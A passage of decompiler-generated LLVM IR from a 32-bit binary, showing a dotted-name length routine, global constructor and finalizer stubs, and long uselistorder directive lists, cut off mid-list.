126, 127, 208, 209, 210, 225, 226, 227, 228, 229, 230, 231, 232, 233, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 240, 417 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_8057b39, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8057b52 = icmp eq i32 %arg1, 0
  br i1 %v1_8057b52, label %dec_label_pc_8057b81, label %dec_label_pc_8057b72.preheader

dec_label_pc_8057b72.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_8057b7210 = add i32 %arg2, %arg1
  %v3_8057b7211 = inttoptr i32 %v2_8057b7210 to i8*
  %v4_8057b7212 = load i8, i8* %v3_8057b7211, align 1
  %v1_8057b7614 = add i32 %arg2, 1
  %v1_8057b7915 = icmp eq i8 %v4_8057b7212, 0
  %v1_8057b7b16 = icmp eq i1 %v1_8057b7915, false
  br i1 %v1_8057b7b16, label %dec_label_pc_8057b61, label %dec_label_pc_8057b7d

dec_label_pc_8057b58:                             ; preds = %dec_label_pc_8057b61
  %v1_8057b58 = add i32 %v0_8057b5817, 2
  br label %dec_label_pc_8057b7d

dec_label_pc_8057b61:                             ; preds = %dec_label_pc_8057b72.preheader, %dec_label_pc_8057b72
  %v1_8057b7619 = phi i32 [ %v1_8057b76, %dec_label_pc_8057b72 ], [ %v1_8057b7614, %dec_label_pc_8057b72.preheader ]
  %v5_8057b7218.in = phi i8 [ %v4_8057b72, %dec_label_pc_8057b72 ], [ %v4_8057b7212, %dec_label_pc_8057b72.preheader ]
  %v0_8057b5817 = phi i32 [ %v2_8057b6f, %dec_label_pc_8057b72 ], [ %arg2, %dec_label_pc_8057b72.preheader ]
  %v5_8057b7218 = zext i8 %v5_8057b7218.in to i32
  %v1_8057b63 = and i32 %v5_8057b7218, 192
  %v6_8057b68 = icmp eq i32 %v1_8057b63, 192
  %v2_8057b6f = add i32 %v5_8057b7218, %v1_8057b7619
  br i1 %v6_8057b68, label %dec_label_pc_8057b58, label %dec_label_pc_8057b72

dec_label_pc_8057b72:                             ; preds = %dec_label_pc_8057b61
  store i32 %v2_8057b6f, i32* @ecx, align 4
  %v2_8057b72 = add i32 %v2_8057b6f, %arg1
  %v3_8057b72 = inttoptr i32 %v2_8057b72 to i8*
  %v4_8057b72 = load i8, i8* %v3_8057b72, align 1
  %v1_8057b76 = add i32 %v2_8057b6f, 1
  %v1_8057b79 = icmp eq i8 %v4_8057b72, 0
  %v1_8057b7b = icmp eq i1 %v1_8057b79, false
  br i1 %v1_8057b7b, label %dec_label_pc_8057b61, label %dec_label_pc_8057b7d

dec_label_pc_8057b7d:                             ; preds = %dec_label_pc_8057b72.preheader, %dec_label_pc_8057b72, %dec_label_pc_8057b58
  %v0_8057b7d = phi i32 [ %v1_8057b58, %dec_label_pc_8057b58 ], [ %v1_8057b7614, %dec_label_pc_8057b72.preheader ], [ %v1_8057b76, %dec_label_pc_8057b72 ]
  %v2_8057b7f = sub i32 %v0_8057b7d, %arg2
  br label %dec_label_pc_8057b81

dec_label_pc_8057b81:                             ; preds = %entry, %dec_label_pc_8057b7d
  %v0_8057b84 = phi i32 [ -1, %entry ], [ %v2_8057b7f, %dec_label_pc_8057b7d ]
  ret i32 %v0_8057b84

; uselistorder directives
  uselistorder i8 %v4_8057b72, { 1, 0 }
  uselistorder i32 %v2_8057b6f, { 2, 3, 1, 0 }
  uselistorder i32 192, { 1, 3, 2, 4, 0 }
  uselistorder i32 2, { 146, 56, 147, 84, 151, 152, 53, 54, 55, 0, 1, 148, 153, 154, 155, 124, 156, 157, 158, 159, 160, 161, 130, 2, 131, 132, 60, 162, 163, 3, 85, 61, 136, 137, 80, 164, 165, 166, 168, 125, 181, 182, 66, 138, 139, 81, 12, 13, 70, 71, 189, 67, 123, 11, 86, 117, 87, 118, 88, 119, 62, 14, 135, 58, 89, 90, 4, 91, 5, 92, 6, 93, 94, 15, 16, 72, 17, 18, 133, 19, 20, 21, 73, 184, 22, 23, 82, 24, 169, 170, 171, 172, 7, 74, 177, 178, 149, 150, 179, 180, 63, 64, 65, 25, 190, 75, 8, 9, 140, 141, 69, 26, 27, 142, 28, 143, 29, 76, 144, 145, 30, 167, 183, 188, 83, 31, 134, 32, 95, 98, 96, 97, 99, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 77, 46, 47, 48, 49, 50, 51, 100, 120, 101, 78, 102, 121, 103, 104, 122, 68, 105, 106, 107, 126, 127, 128, 129, 108, 109, 110, 111, 173, 57, 174, 10, 175, 112, 59, 176, 113, 114, 115, 187, 79, 185, 52, 186, 116 }
  uselistorder i8 0, { 39, 4, 7, 8, 40, 6, 5, 147, 148, 10, 155, 150, 151, 9, 153, 154, 152, 31, 156, 1, 2, 59, 60, 61, 157, 158, 34, 159, 11, 13, 136, 135, 12, 41, 160, 161, 162, 79, 80, 16, 170, 166, 167, 165, 14, 168, 169, 15, 32, 171, 172, 181, 182, 183, 184, 185, 203, 204, 18, 138, 137, 17, 139, 140, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 3, 195, 97, 98, 225, 99, 228, 42, 54, 37, 38, 76, 19, 227, 209, 210, 62, 211, 212, 213, 214, 215, 216, 43, 217, 21, 193, 194, 20, 149, 100, 101, 55, 29, 28, 0, 44, 45, 46, 102, 186, 198, 199, 134, 176, 177, 173, 175, 174, 103, 104, 105, 106, 107, 108, 109, 110, 111, 22, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 30, 125, 126, 127, 128, 129, 130, 131, 132, 57, 226, 178, 179, 180, 133, 163, 164, 63, 64, 23, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 77, 78, 141, 142, 143, 144, 145, 146, 56, 35, 187, 188, 189, 190, 191, 192, 196, 197, 200, 201, 202, 24, 205, 206, 36, 207, 33, 208, 218, 223, 222, 25, 219, 220, 27, 221, 26, 224, 58, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* @ecx, { 26, 5, 7, 25, 6, 120, 121, 13, 122, 123, 124, 125, 14, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 36, 43, 37, 38, 39, 40, 41, 42, 142, 143, 8, 9, 110, 1, 111, 51, 11, 17, 144, 145, 15, 10, 16, 146, 151, 152, 153, 154, 155, 158, 159, 160, 161, 12, 112, 2, 113, 52, 53, 30, 54, 148, 149, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 27, 80, 81, 82, 83, 28, 84, 24, 18, 46, 47, 48, 49, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 19, 186, 162, 163, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 20, 202, 203, 205, 206, 207, 208, 204, 211, 156, 0, 31, 32, 147, 85, 86, 87, 88, 89, 90, 91, 29, 92, 93, 94, 95, 96, 97, 21, 22, 3, 4, 98, 99, 23, 100, 101, 102, 103, 104, 106, 107, 108, 109, 34, 35, 105, 209, 150, 210, 212, 213, 214, 33, 44, 45, 50, 114, 115, 116, 117, 118, 119, 157 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057b81, { 1, 0 }
  uselistorder label %dec_label_pc_8057b7d, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8057b61, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_8057b9c = load i32, i32* @global_var_805b000.530, align 4096
  %v10_8057ba1 = icmp eq i32 %v0_8057b9c, -1
  br i1 %v10_8057ba1, label %dec_label_pc_8057bbc, label %dec_label_pc_8057bb0.preheader

dec_label_pc_8057bb0.preheader:                   ; preds = %entry
  br label %dec_label_pc_8057bb0

dec_label_pc_8057bb0:                             ; preds = %dec_label_pc_8057bb0.preheader, %dec_label_pc_8057bb0
  %v4_8057bb3 = phi i32 [ %v0_8057b9c, %dec_label_pc_8057bb0.preheader ], [ %v2_8057bb5, %dec_label_pc_8057bb0 ]
  %v0_8057bb0 = phi i32 [ ptrtoint (i32* @global_var_805b000.530 to i32), %dec_label_pc_8057bb0.preheader ], [ %v1_8057bb0, %dec_label_pc_8057bb0 ]
  %v1_8057bb0 = add i32 %v0_8057bb0, -4
  call void @__pseudo_call(i32 %v4_8057bb3)
  %v1_8057bb5 = inttoptr i32 %v1_8057bb0 to i32*
  %v2_8057bb5 = load i32, i32* %v1_8057bb5, align 4
  %v10_8057bb7 = icmp eq i32 %v2_8057bb5, -1
  %v1_8057bba = icmp eq i1 %v10_8057bb7, false
  br i1 %v1_8057bba, label %dec_label_pc_8057bb0, label %dec_label_pc_8057bbc.loopexit

dec_label_pc_8057bbc.loopexit:                    ; preds = %dec_label_pc_8057bb0
  %v2_8057bbc.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8057bbc

dec_label_pc_8057bbc:                             ; preds = %dec_label_pc_8057bbc.loopexit, %entry
  %v2_8057bbc = phi i32 [ %v2_8057bbc.pre, %dec_label_pc_8057bbc.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_8057bbc

; uselistorder directives
  uselistorder i32 %v0_8057b9c, { 1, 0 }
  uselistorder i1 false, { 913, 493, 5, 3, 4, 7, 494, 495, 497, 496, 6, 499, 498, 508, 42, 43, 503, 507, 505, 506, 67, 500, 501, 504, 509, 510, 511, 512, 513, 157, 159, 160, 161, 162, 158, 163, 164, 167, 59, 165, 60, 166, 514, 515, 520, 44, 516, 517, 519, 518, 521, 522, 527, 526, 523, 524, 525, 8, 0, 9, 433, 434, 435, 68, 528, 529, 530, 531, 532, 533, 312, 313, 314, 534, 45, 535, 315, 316, 317, 859, 542, 46, 10, 537, 538, 539, 540, 541, 557, 558, 47, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 841, 842, 844, 843, 11, 436, 437, 438, 439, 318, 319, 320, 577, 578, 550, 551, 552, 321, 322, 323, 324, 325, 326, 327, 95, 328, 329, 330, 331, 332, 333, 819, 820, 821, 822, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 914, 915, 61, 2, 350, 69, 97, 351, 352, 860, 861, 862, 931, 932, 933, 934, 937, 70, 938, 939, 936, 930, 916, 135, 422, 423, 424, 425, 426, 427, 917, 918, 98, 227, 228, 229, 230, 231, 232, 12, 428, 429, 62, 490, 13, 590, 591, 168, 921, 922, 923, 924, 925, 928, 929, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 863, 169, 170, 171, 172, 173, 174, 175, 176, 177, 876, 877, 878, 879, 880, 881, 882, 883, 884, 38, 886, 885, 890, 887, 888, 889, 14, 891, 892, 430, 431, 849, 579, 580, 582, 583, 935, 16, 816, 815, 15, 502, 353, 354, 71, 829, 830, 831, 833, 832, 17, 834, 355, 18, 581, 835, 836, 432, 356, 555, 553, 554, 19, 48, 543, 548, 547, 72, 549, 545, 544, 73, 546, 178, 556, 179, 96, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 377, 376, 378, 379, 380, 381, 382, 384, 39, 385, 383, 386, 388, 387, 20, 389, 390, 392, 391, 74, 393, 394, 395, 396, 397, 99, 398, 399, 107, 108, 400, 109, 110, 401, 402, 111, 403, 404, 100, 112, 405, 406, 407, 408, 409, 101, 410, 102, 113, 103, 411, 104, 412, 413, 414, 105, 415, 106, 416, 114, 417, 418, 419, 154, 155, 919, 75, 920, 21, 559, 560, 561, 562, 563, 564, 536, 926, 927, 180, 181, 182, 183, 184, 185, 852, 207, 188, 115, 186, 187, 76, 77, 189, 190, 22, 23, 191, 192, 193, 194, 195, 196, 197, 24, 25, 198, 199, 200, 201, 202, 203, 204, 205, 64, 63, 206, 208, 78, 41, 116, 40, 117, 118, 119, 120, 209, 121, 212, 210, 211, 213, 214, 215, 216, 122, 217, 123, 218, 219, 220, 222, 221, 26, 223, 224, 225, 226, 233, 234, 235, 124, 236, 237, 238, 239, 240, 241, 244, 125, 242, 243, 85, 86, 245, 49, 246, 247, 248, 249, 250, 251, 252, 255, 126, 253, 254, 83, 84, 256, 257, 258, 259, 260, 261, 264, 127, 262, 263, 81, 82, 265, 93, 50, 266, 267, 268, 92, 269, 270, 271, 272, 273, 274, 277, 128, 275, 276, 79, 80, 278, 94, 51, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 129, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 420, 421, 440, 130, 461, 131, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 87, 88, 462, 463, 464, 465, 466, 467, 468, 469, 470, 1, 471, 132, 472, 473, 474, 133, 475, 476, 134, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 491, 492, 584, 585, 586, 587, 588, 28, 589, 27, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 52, 799, 800, 801, 802, 803, 66, 804, 805, 806, 807, 808, 809, 810, 811, 812, 817, 813, 814, 53, 818, 823, 91, 824, 54, 825, 55, 826, 828, 827, 29, 839, 837, 838, 30, 840, 31, 845, 846, 847, 32, 848, 65, 850, 851, 853, 854, 855, 56, 856, 857, 858, 893, 909, 894, 895, 896, 897, 902, 906, 907, 908, 33, 898, 89, 899, 900, 901, 57, 37, 903, 36, 58, 35, 904, 905, 34, 910, 911, 912, 156, 90, 940, 941, 942 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 45, 22, 36, 37, 38, 39, 51, 52, 53, 54, 5, 55, 1, 50, 23, 40, 3, 41, 42, 43, 6, 56, 57, 58, 59, 60, 61, 7, 48, 46, 47, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 8, 2, 44, 9, 0, 49 }
  uselistorder i32 ptrtoint (i32* @global_var_805b000.530 to i32), { 0, 2, 3, 4, 1 }
  uselistorder i32 -1, {}
  uselistorder i32 1, { 433, 887, 253, 753, 888, 249, 889, 119, 890, 268, 891, 892, 179, 435, 434, 98, 269, 270, 893, 254, 250, 896, 375, 897, 898, 899, 341, 900, 0, 418, 37, 36, 901, 902, 437, 436, 201, 200, 202, 903, 438, 904, 439, 203, 905, 906, 440, 205, 204, 206, 784, 785, 786, 787, 788, 789, 790, 791, 792, 444, 443, 442, 419, 441, 420, 40, 39, 38, 41, 793, 794, 447, 446, 445, 421, 422, 76, 72, 74, 71, 73, 75, 313, 907, 908, 245, 414, 909, 910, 271, 911, 342, 912, 913, 448, 196, 314, 917, 914, 915, 916, 255, 451, 450, 449, 88, 87, 918, 452, 133, 866, 867, 868, 272, 869, 919, 920, 921, 453, 208, 207, 210, 209, 343, 922, 169, 923, 454, 99, 273, 274, 67, 69, 68, 70, 275, 455, 192, 315, 1, 457, 456, 121, 122, 458, 211, 459, 108, 344, 460, 246, 927, 928, 251, 929, 276, 256, 930, 931, 932, 933, 934, 935, 936, 277, 463, 462, 461, 952, 953, 954, 955, 956, 957, 958, 959, 2, 960, 278, 961, 962, 963, 279, 964, 965, 280, 966, 967, 968, 969, 970, 345, 431, 465, 464, 79, 78, 80, 316, 317, 1018, 1019, 1020, 1021, 257, 870, 871, 872, 466, 178, 467, 819, 468, 100, 101, 318, 937, 423, 212, 347, 820, 821, 822, 281, 346, 469, 823, 824, 825, 282, 826, 827, 481, 480, 479, 478, 477, 476, 475, 474, 473, 472, 471, 470, 221, 222, 218, 214, 220, 213, 215, 217, 216, 219, 995, 996, 3, 184, 183, 182, 181, 180, 482, 223, 224, 483, 164, 163, 828, 829, 484, 115, 114, 116, 1078, 1079, 1080, 485, 45, 44, 46, 43, 830, 486, 28, 25, 27, 23, 24, 26, 319, 320, 489, 488, 487, 490, 193, 491, 493, 492, 34, 495, 494, 66, 497, 496, 120, 498, 225, 499, 226, 500, 227, 501, 228, 503, 502, 168, 505, 504, 56, 507, 506, 102, 509, 508, 113, 510, 514, 513, 512, 511, 89, 1083, 1084, 1085, 516, 515, 103, 104, 321, 518, 517, 521, 520, 519, 229, 522, 322, 387, 752, 4, 528, 527, 526, 525, 524, 523, 64, 65, 1081, 531, 530, 529, 177, 175, 176, 348, 532, 813, 814, 815, 816, 533, 84, 83, 86, 82, 85, 323, 324, 388, 263, 389, 390, 264, 391, 534, 535, 152, 153, 881, 754, 252, 882, 392, 883, 424, 536, 150, 149, 148, 151, 537, 140, 137, 136, 138, 142, 141, 139, 47, 52, 50, 48, 49, 51, 349, 539, 538, 350, 540, 351, 541, 352, 544, 543, 542, 393, 547, 546, 545, 230, 353, 1032, 1033, 1034, 548, 118, 1035, 1036, 258, 1037, 1038, 1039, 107, 105, 106, 394, 1031, 283, 231, 232, 234, 233, 354, 325, 795, 796, 797, 798, 551, 550, 549, 54, 53, 55, 355, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 284, 1049, 1050, 1051, 1052, 1053, 328, 1054, 1055, 244, 329, 1056, 1057, 1058, 1059, 326, 327, 1060, 1061, 1062, 554, 553, 552, 93, 92, 91, 95, 94, 330, 331, 555, 332, 333, 285, 559, 558, 557, 556, 109, 286, 395, 560, 561, 562, 563, 564, 565, 566, 567, 971, 5, 972, 356, 265, 357, 976, 6, 572, 571, 570, 569, 568, 194, 195, 573, 574, 997, 998, 575, 61, 578, 577, 576, 171, 579, 988, 989, 990, 894, 895, 831, 832, 432, 580, 90, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 833, 973, 974, 975, 582, 581, 132, 131, 130, 1013, 1014, 584, 583, 187, 186, 185, 266, 1015, 863, 864, 585, 111, 110, 112, 1087, 586, 189, 188, 190, 587, 588, 940, 941, 942, 287, 42, 358, 359, 360, 939, 589, 361, 362, 938, 288, 7, 591, 590, 235, 363, 592, 63, 364, 593, 62, 334, 594, 173, 172, 834, 835, 755, 290, 836, 837, 838, 839, 840, 842, 843, 844, 291, 845, 846, 396, 289, 847, 292, 848, 849, 850, 841, 598, 597, 596, 595, 157, 159, 158, 154, 155, 156, 160, 851, 599, 60, 57, 59, 58, 293, 600, 852, 853, 602, 601, 162, 161, 854, 855, 756, 757, 335, 856, 336, 857, 858, 859, 294, 860, 365, 861, 605, 604, 603, 29, 32, 31, 30, 33, 295, 366, 8, 367, 606, 607, 97, 96, 1082, 609, 608, 236, 237, 337, 1086, 610, 238, 368, 243, 369, 943, 944, 945, 946, 947, 948, 949, 950, 951, 614, 613, 612, 611, 35, 617, 616, 615, 618, 370, 924, 925, 371, 372, 926, 620, 619, 622, 621, 21, 624, 623, 174, 625, 134, 626, 239, 628, 627, 117, 629, 135, 630, 81, 631, 77, 22, 633, 632, 197, 634, 199, 635, 167, 636, 240, 637, 638, 640, 639, 125, 641, 127, 643, 642, 123, 645, 644, 124, 646, 198, 126, 799, 259, 376, 267, 800, 9, 10, 247, 398, 647, 758, 801, 802, 803, 804, 805, 806, 807, 338, 296, 397, 373, 399, 808, 656, 655, 654, 653, 652, 651, 650, 649, 648, 425, 191, 809, 810, 662, 661, 660, 659, 426, 658, 657, 400, 811, 812, 664, 663, 759, 297, 817, 818, 760, 298, 299, 761, 762, 300, 763, 301, 764, 765, 766, 767, 768, 769, 770, 771, 665, 128, 129, 862, 401, 668, 667, 666, 865, 669, 873, 772, 773, 774, 775, 776, 777, 339, 402, 874, 670, 675, 674, 673, 672, 671, 427, 145, 146, 147, 875, 876, 11, 403, 676, 877, 878, 879, 680, 679, 678, 677, 143, 144, 880, 684, 683, 682, 681, 884, 779, 12, 780, 781, 782, 783, 885, 886, 690, 689, 688, 687, 686, 685, 165, 166, 404, 405, 691, 695, 694, 693, 692, 380, 778, 977, 696, 697, 241, 242, 302, 698, 13, 700, 699, 14, 15, 304, 978, 406, 303, 340, 979, 980, 702, 701, 381, 981, 982, 407, 377, 378, 983, 703, 428, 984, 985, 704, 379, 408, 305, 986, 987, 711, 710, 709, 708, 707, 706, 705, 248, 991, 992, 712, 382, 713, 714, 715, 716, 306, 993, 994, 718, 717, 719, 999, 1000, 16, 409, 1001, 307, 308, 1002, 1003, 722, 721, 720, 429, 1004, 724, 723, 1005, 726, 725, 410, 1016, 728, 727, 1017, 729, 383, 1022, 1023, 384, 1024, 1025, 385, 386, 1026, 1027, 730, 1028, 17, 1029, 411, 412, 734, 733, 732, 731, 413, 18, 309, 1030, 736, 735, 738, 737, 19, 741, 740, 739, 743, 742, 1063, 1064, 415, 1072, 1073, 262, 1074, 745, 744, 374, 20, 747, 746, 310, 1065, 261, 1066, 1067, 311, 1068, 260, 1070, 1071, 312, 416, 417, 1069, 430, 1075, 1076, 748, 1077, 1088, 170, 750, 749, 751 }
  uselistorder label %dec_label_pc_8057bb0, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_8057bc7 = load i32, i32* @ebx, align 4
  %v1_8057bc8 = call i32 @__get_pc_thunk_bx(i32 %v0_8057bc7)
  store i32 %v1_8057bc8, i32* @eax, align 4
  %v0_8057bd3 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8057bd3

; uselistorder directives
  uselistorder i32* @eax, { 45, 25, 104, 2, 105, 106, 1, 107, 0, 24, 103, 108, 26, 109, 52, 53, 55, 46, 54, 110, 115, 111, 112, 113, 114, 3, 4, 82, 83, 175, 116, 33, 30, 123, 31, 124, 125, 126, 127, 35, 36, 143, 144, 37, 145, 38, 146, 39, 40, 41, 147, 148, 149, 150, 42, 151, 152, 153, 154, 43, 136, 163, 177, 178, 48, 179, 180, 182, 49, 183, 5, 181, 9, 11, 176, 101, 47, 56, 57, 156, 58, 164, 166, 167, 165, 59, 60, 168, 169, 171, 172, 170, 155, 44, 6, 7, 132, 133, 134, 32, 135, 128, 129, 130, 131, 61, 62, 137, 138, 63, 64, 84, 86, 85, 87, 88, 90, 51, 89, 139, 140, 34, 141, 142, 117, 27, 28, 118, 119, 120, 121, 29, 122, 12, 65, 66, 67, 13, 14, 16, 15, 68, 70, 71, 69, 72, 73, 74, 75, 76, 77, 17, 78, 18, 79, 19, 80, 20, 81, 91, 92, 21, 93, 94, 95, 96, 97, 98, 99, 22, 100, 23, 50, 102, 157, 158, 159, 160, 161, 162, 184, 173, 174, 8, 10 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 1392, 19, 20, 21, 122, 78, 901, 1393, 1396, 1394, 1395, 902, 1126, 1127, 300, 1407, 1399, 1401, 1402, 24, 68, 1403, 1404, 1405, 903, 1406, 135, 136, 137, 1397, 1398, 144, 1408, 1409, 1411, 1412, 1410, 1413, 263, 1414, 1415, 1416, 1417, 1418, 1419, 146, 147, 904, 335, 336, 1023, 905, 1024, 145, 1025, 1026, 1027, 1028, 1029, 1030, 81, 82, 1031, 1032, 1033, 872, 1034, 80, 906, 79, 907, 148, 149, 908, 22, 909, 1035, 23, 910, 150, 337, 911, 912, 151, 913, 1422, 914, 1420, 242, 1421, 338, 339, 152, 153, 69, 915, 1423, 1424, 1425, 1426, 1427, 340, 916, 917, 154, 1428, 25, 83, 1354, 117, 118, 918, 1429, 84, 919, 26, 920, 1128, 341, 1430, 1431, 1432, 1129, 1130, 16, 264, 156, 155, 1131, 1132, 265, 1133, 921, 1433, 1434, 922, 1134, 923, 1135, 1136, 1137, 1138, 1435, 157, 924, 158, 342, 1442, 1438, 1439, 1440, 1441, 125, 27, 1455, 1456, 1469, 1470, 1471, 1472, 1478, 1479, 1480, 1481, 1473, 1474, 1475, 1476, 1477, 85, 86, 925, 1482, 1483, 159, 926, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 160, 1563, 1564, 161, 1565, 1566, 1567, 87, 126, 266, 138, 927, 127, 1139, 162, 1140, 28, 128, 119, 1141, 223, 163, 1142, 0, 1143, 1443, 1444, 1451, 343, 1452, 928, 1144, 344, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 164, 929, 1152, 1153, 1154, 1155, 165, 1156, 930, 218, 345, 166, 931, 932, 933, 167, 1157, 267, 1158, 1544, 1545, 1546, 268, 323, 324, 1547, 1548, 1549, 1550, 1551, 1552, 934, 269, 1159, 120, 935, 1160, 168, 270, 271, 1161, 1162, 936, 1163, 1164, 1165, 1166, 113, 1638, 1639, 1640, 1641, 1642, 1643, 1644, 1645, 1, 224, 1167, 129, 1168, 225, 937, 938, 1169, 169, 1170, 1575, 1590, 1591, 1592, 346, 1593, 1367, 1594, 1044, 1647, 1648, 1649, 1650, 1651, 1036, 1652, 1595, 1596, 1653, 170, 1654, 1665, 1666, 29, 939, 2, 143, 940, 941, 1678, 1682, 226, 1683, 171, 845, 347, 348, 3, 1655, 1656, 1657, 172, 173, 991, 871, 174, 942, 1334, 272, 273, 175, 1335, 1336, 176, 177, 1338, 1337, 1339, 1340, 349, 846, 1341, 1343, 1342, 1344, 1658, 1659, 178, 943, 1664, 1083, 1084, 1085, 1086, 944, 945, 1087, 1088, 1089, 274, 179, 180, 181, 350, 351, 121, 352, 1346, 1345, 353, 1353, 182, 183, 946, 1037, 947, 1038, 184, 948, 185, 949, 1381, 88, 1382, 1383, 1384, 1385, 1386, 4, 950, 1524, 951, 1039, 1040, 1041, 1042, 952, 186, 1667, 847, 187, 275, 1671, 1674, 1673, 1599, 276, 1600, 1601, 1602, 1603, 277, 1604, 1605, 1606, 354, 1597, 355, 1598, 356, 953, 1045, 139, 1046, 278, 954, 1047, 955, 956, 357, 848, 957, 358, 849, 188, 958, 1607, 1608, 189, 190, 359, 850, 141, 71, 72, 1609, 1610, 1611, 1612, 1613, 1614, 191, 192, 360, 851, 140, 1615, 227, 1616, 123, 1617, 1618, 1620, 959, 1619, 5, 1043, 6, 1672, 1347, 1348, 1349, 1350, 1352, 1351, 7, 279, 1576, 1577, 1578, 1502, 960, 280, 1503, 961, 1504, 1505, 1506, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1568, 1553, 193, 194, 962, 963, 281, 1679, 1681, 30, 1400, 8, 195, 1171, 1172, 361, 1173, 196, 964, 1174, 228, 130, 1559, 1560, 1175, 89, 1507, 965, 282, 283, 197, 1176, 1177, 1178, 198, 1453, 90, 966, 1445, 967, 1450, 1449, 229, 968, 969, 1446, 1448, 1447, 230, 970, 1048, 1454, 1049, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 199, 971, 1191, 284, 1192, 1193, 1194, 1195, 1196, 31, 32, 972, 250, 251, 1197, 1198, 1199, 1200, 200, 1201, 1202, 1203, 973, 1204, 33, 34, 201, 974, 1205, 1206, 1207, 1210, 1208, 1209, 35, 73, 91, 1211, 1212, 1213, 1214, 325, 1215, 1216, 202, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 204, 1225, 1226, 1227, 975, 1228, 1229, 231, 232, 1230, 1231, 1232, 205, 203, 1233, 206, 1234, 1235, 976, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 207, 977, 978, 208, 1255, 1256, 1257, 979, 980, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 981, 982, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 983, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 285, 984, 286, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 287, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 36, 92, 93, 94, 95, 1314, 1315, 1316, 1317, 1318, 1319, 209, 1320, 985, 1321, 1322, 1323, 1324, 852, 1325, 